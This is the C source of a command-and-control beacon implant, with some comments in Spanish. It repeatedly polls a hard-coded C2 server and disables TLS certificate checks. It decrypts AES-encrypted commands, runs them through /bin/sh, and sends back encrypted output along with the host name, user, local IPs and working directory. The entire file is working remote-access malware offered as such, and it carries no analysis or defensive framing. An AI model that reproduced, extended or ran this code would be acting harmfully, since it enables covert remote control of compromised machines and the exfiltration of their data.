#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <pwd.h>
#include <errno.h>
#include <curl/curl.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/wait.h>
#include <stdarg.h>
#include <netdb.h>
#include <sys/utsname.h>
#include <openssl/rand.h>

#include "aes.h"
#include "cJSON.h"


#define C2_URL        "https://192.168.1.89:4444"
#define CLIENT_ID     "android"
#define MALEABLE      "/pleasesubscribe/v1/users/"

#define USER_AGENTS_COUNT 4
const char* USER_AGENTS[USER_AGENTS_COUNT] = {
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
    "curl/7.88.1"
};

unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
                                  const unsigned char* plaintext, size_t len, int* out_len);

unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
                                  const unsigned char* ciphertext, size_t len, int* out_len);

// === BASE64 SIN OPENSSL ===
static const char b64_table[65] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* base64_encode(const unsigned char* data, size_t input_length) {
    if (!data || input_length == 0) return NULL;
    size_t output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = malloc(output_length + 1);
    if (!encoded_data) return NULL;

    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = b64_table[(triple >> 18) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 12) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 6) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 0) & 0x3F];
    }

    int pad = (3 - (input_length % 3)) % 3;
    for (int i = 0; i < pad; i++)
        encoded_data[output_length - 1 - i] = '=';

    encoded_data[output_length] = '\0';
    return encoded_data;
}

unsigned char* base64_decode(const char* data, size_t* out_len) {
    if (!data || !out_len) return NULL;
    size_t len = strlen(data);
    if (len == 0) { *out_len = 0; return NULL; }

    // Contar '=' al final
    int pad = 0;
    if (len >= 2 && data[len-1] == '=') pad++;
    if (len >= 2 && data[len-2] == '=') pad++;

    size_t decoded_len = (len * 3) / 4 - pad;
    unsigned char* decoded = malloc(decoded_len + 1);
    if (!decoded) { *out_len = 0; return NULL; }

    uint32_t triple;
    size_t i = 0, j = 0;
    while (i + 4 <= len) {
        int val[4] = {0};
        for (int k = 0; k < 4; k++) {
            char c = data[i + k];
            if (c >= 'A' && c <= 'Z') val[k] = c - 'A';
            else if (c >= 'a' && c <= 'z') val[k] = c - 'a' + 26;
            else if (c >= '0' && c <= '9') val[k] = c - '0' + 52;
            else if (c == '+') val[k] = 62;
            else if (c == '/') val[k] = 63;
            else if (c == '=') val[k] = 0;
            else { free(decoded); *out_len = 0; return NULL; }
        }
        triple = (val[0] << 18) + (val[1] << 12) + (val[2] << 6) + val[3];
        if (j < decoded_len) decoded[j++] = (triple >> 16) & 0xFF;
        if (j < decoded_len) decoded[j++] = (triple >> 8) & 0xFF;
        if (j < decoded_len) decoded[j++] = triple & 0xFF;
        i += 4;
    }
    decoded[decoded_len] = '\0';
    *out_len = decoded_len;
    return decoded;
}



// === AES CFB ===
unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
                                  const unsigned char* plaintext, size_t len, int* out_len) {
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    unsigned char* ciphertext = malloc(len);
    unsigned char iv_buf[16];
    memcpy(iv_buf, iv, 16);
    size_t i = 0;
    while (i < len) {
        unsigned char encrypted_iv[16];
        memcpy(encrypted_iv, iv_buf, 16);
        AES_ECB_encrypt(&ctx, encrypted_iv);
        size_t block_size = (len - i > 16) ? 16 : (len - i);
        for (size_t j = 0; j < block_size; j++) {
            ciphertext[i + j] = plaintext[i + j] ^ encrypted_iv[j];
        }
        if (block_size == 16) {
            memcpy(iv_buf, &ciphertext[i], 16);
        } else {
            memcpy(iv_buf, &ciphertext[i], block_size);
            memset(iv_buf + block_size, 0, 16 - block_size);
        }
        i += block_size;
    }
    *out_len = len;
    return ciphertext;
}

unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
                                  const unsigned char* ciphertext, size_t len, int* out_len) {
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    unsigned char* plaintext = malloc(len + 1);
    unsigned char iv_buf[16];
    memcpy(iv_buf, iv, 16);
    size_t i = 0;
    while (i < len) {
        unsigned char encrypted_iv[16];
        memcpy(encrypted_iv, iv_buf, 16);
        AES_ECB_encrypt(&ctx, encrypted_iv);
        size_t block_size = (len - i > 16) ? 16 : (len - i);
        for (size_t j = 0; j < block_size; j++) {
            plaintext[i + j] = ciphertext[i + j] ^ encrypted_iv[j];
        }
        if (block_size == 16) {
            memcpy(iv_buf, &ciphertext[i], 16);
        } else {
            memcpy(iv_buf, &ciphertext[i], block_size);
            memset(iv_buf + block_size, 0, 16 - block_size);
        }
        i += block_size;
    }
    plaintext[len] = '\0';
    *out_len = len;
    return plaintext;
}


// === HTTPS REQUEST ===
struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

char* https_request(const char* url, const char* method, const char* post_data) {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk = {0};

    curl = curl_easy_init();
    if (!curl) return NULL;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, USER_AGENTS[rand() % USER_AGENTS_COUNT]);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");

    if (strcmp(method, "POST") == 0 && post_data) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data));
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: text/plain");
        headers = curl_slist_append(headers, "Expect:");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        res = curl_easy_perform(curl);
        curl_slist_free_all(headers); // Liberar headers después de perform
    } else {
        res = curl_easy_perform(curl);
    }

    curl_easy_cleanup(curl); // Siempre limpiar el handle

    fprintf(stderr, "[ARM DEBUG] curl_easy_perform returned: %d (%s)\n", res, curl_easy_strerror(res));
    fflush(stderr);
    fprintf(stderr, "[ARM DEBUG] chunk.size = %zu\n", chunk.size);
    fflush(stderr);

    if (res != CURLE_OK) {
        free(chunk.memory);
        return NULL;
    }

    char *result = malloc(chunk.size + 1);
    if (!result) {
        free(chunk.memory);
        return NULL;
    }
    memcpy(result, chunk.memory, chunk.size);
    result[chunk.size] = '\0';
    free(chunk.memory);
    return result;
}

// === EXEC CMD ===
char* exec_cmd(const char* cmd, int* out_len) {
    int pipefd[2];
    if (pipe(pipefd) == -1) return NULL;

    pid_t pid = fork();
    if (pid == -1) {
        close(pipefd[0]);
        close(pipefd[1]);
        return NULL;
    }

    if (pid == 0) {
        // Hijo: cierra lectura, redirige stdout, ejecuta
        close(pipefd[0]);
        dup2(pipefd[1], 1);
        close(pipefd[1]);
        char *args[] = {"sh", "-c", (char*)cmd, NULL};
        execv("/bin/sh", args);
        exit(1);
    } else {
        // Padre: cierra escritura, lee salida, libera todo
        close(pipefd[1]);
        char* buffer = malloc(8192); // Doble buffer para mayor seguridad
        if (!buffer) {
            close(pipefd[0]);
            waitpid(pid, NULL, 0);
            return NULL;
        }
        ssize_t total = 0;
        ssize_t n;
        while ((n = read(pipefd[0], buffer + total, 8191 - total)) > 0) {
            total += n;
            if (total >= 8191) break;
        }
        close(pipefd[0]);
        buffer[total] = '\0';
        waitpid(pid, NULL, 0);
        *out_len = total;
        return buffer;
    }
}



// === GET LOCAL IPs ===
char* get_local_ips() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return strdup("127.0.0.1");

    struct ifconf ifc;
    char buf[1024];
    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sockfd, SIOCGIFCONF, &ifc) < 0) {
        close(sockfd);
        return strdup("127.0.0.1");
    }

    struct ifreq* ifr = ifc.ifc_req;
    int n = ifc.ifc_len / sizeof(struct ifreq);
    char* result = calloc(1, 1024);
    if (!result) {
        close(sockfd);
        return strdup("127.0.0.1");
    }

    for (int i = 0; i < n; i++) {
        struct sockaddr_in* addr = (struct sockaddr_in*)&ifr[i].ifr_addr;
        if (addr->sin_family == AF_INET && strcmp(ifr[i].ifr_name, "lo") != 0) {
            char ip[INET_ADDRSTRLEN];
            if (inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN)) {
                int len = strlen(result);
                if (len > 0) {
                    snprintf(result + len, 1024 - len, ", ");
                    len += 2; // length of ", "
                }
                snprintf(result + len, 1024 - len, "%s", ip);
            }
        }
    }
    close(sockfd);
    return strlen(result) > 0 ? result : strdup("127.0.0.1");
}


// === MAIN ===

// === MAIN ===
int main() {
    printf("[*] Beacon starting...\n");
    srand(time(NULL));
    const char* KEY_HEX = "18547a9428b62fdf2ba11cebc786bccbca8a941748d3acf4aad100ac65d0477f";
    unsigned char AES_KEY[32];
    for (int i = 0; i < 32; i++) {
        sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);
    }

    char full_url[512];
    snprintf(full_url, sizeof(full_url), "%s%s%s", C2_URL, MALEABLE, CLIENT_ID);

    while (1) {
        printf("[*] Checking for new command...\n");

        // 🔥 LIMPIAR BUFFER ANTES DE CADA COMANDO
        //g_output_len = 0;
        //g_beacon_output[0] = '\0';

        char* b64_resp = https_request(full_url, "GET", NULL);
        if (!b64_resp || strlen(b64_resp) == 0) {
            printf("[-] Empty or NULL response from C2\n");
            if (b64_resp) free(b64_resp);   
            sleep(6);
            continue;
        }

        printf("[+] Raw C2 response (Base64): %.64s...\n", b64_resp);

        int enc_len = 0;
        unsigned char* encrypted = base64_decode(b64_resp, &enc_len);
        if (b64_resp) free(b64_resp);   
        if (!encrypted || enc_len < 16) {
            free(encrypted);
            sleep(6);
            continue;
        }

        unsigned char* iv = encrypted;
        unsigned char* ciphertext = encrypted + 16;
        int plain_len = 0;
        char* plaintext = (char*)aes256_cfb_decrypt(AES_KEY, iv, ciphertext, enc_len - 16, &plain_len);
        free(encrypted);
        if (!plaintext) {
            sleep(6);
            continue;
        }
        plaintext[plain_len] = '\0';
        char* command = plaintext;

        if (strlen(command) == 0) {
            free(plaintext);
            sleep(6);
            continue;
        }

        printf("[*] Received command: '%s'\n", command);

        int output_len = 0;
        char* output = NULL;


        output = exec_cmd(command, &output_len);
        if (!output) output = strdup("Command failed or no output");


        if (!output) {
            output = strdup("");
            output_len = 0;
        }

        printf("[*] Command/BOF output:\n%s\n", output);

        // === CONSTRUIR JSON ===
        char hostname[256];
        gethostname(hostname, sizeof(hostname) - 1);
        struct passwd *pw = getpwuid(getuid());
        char* user = pw ? pw->pw_name : "unknown";
        char* ips = get_local_ips();
        char* pwd = getcwd(NULL, 0);
        if (!pwd) pwd = strdup("/");

        cJSON *root = cJSON_CreateObject();
        cJSON_AddStringToObject(root, "output", output);
        cJSON_AddStringToObject(root, "client", "linux");
        cJSON_AddStringToObject(root, "command", command);
        cJSON_AddNumberToObject(root, "pid", (double)getpid());
        cJSON_AddStringToObject(root, "hostname", hostname);
        cJSON_AddStringToObject(root, "ips", ips);
        cJSON_AddStringToObject(root, "user", user);
        cJSON_AddStringToObject(root, "discovered_ips", "");
        cJSON_AddNullToObject(root, "result_portscan");
        cJSON_AddStringToObject(root, "result_pwd", pwd);

        char* json_str = cJSON_PrintUnformatted(root);
        cJSON_Delete(root);

        if (!json_str) {
            printf("[-] Failed to create JSON\n");
            free(output);
            free(plaintext);
            free(ips);
            free(pwd);
            sleep(6);
            continue;
        }

        printf("[DEBUG] JSON a enviar: %.256s\n", json_str);

        // === ENCRIPTAR Y ENVIAR ===
        unsigned char iv_out[16];
        RAND_bytes(iv_out, 16);
        int encrypted_len = 0;
        unsigned char* encrypted_resp = aes256_cfb_encrypt(AES_KEY, iv_out, (unsigned char*)json_str, strlen(json_str), &encrypted_len);

        if (encrypted_resp) {
            unsigned char* full_enc = malloc(16 + encrypted_len);
            memcpy(full_enc, iv_out, 16);
            memcpy(full_enc + 16, encrypted_resp, encrypted_len);
            char* b64_resp = base64_encode(full_enc, 16 + encrypted_len);

            if (b64_resp) {
                printf("[*] Sending response to C2...\n");
                printf("[DEBUG] b64_resp: %.64s...\n", b64_resp);

                char* response = https_request(full_url, "POST", b64_resp);

                printf("[DEBUG] https_request POST retornó: %p\n", (void*)response);
                fflush(stdout);
                if (response) {
                    printf("[DEBUG] Respuesta del C2: %.128s\n", response);
                    fflush(stdout);
                    free(response);
                } else {
                    printf("[-] No hubo respuesta del C2 (timeout o error)\n");
                    fflush(stdout);
                }

                free(b64_resp);
            } else {
                printf("[-] Failed to encode response\n");
            }
            free(full_enc);
            free(encrypted_resp);
        }

        free(json_str);
        free(output);
        free(plaintext);
        free(ips);
        free(pwd);

        sleep(6);
    }

    return 0;
}
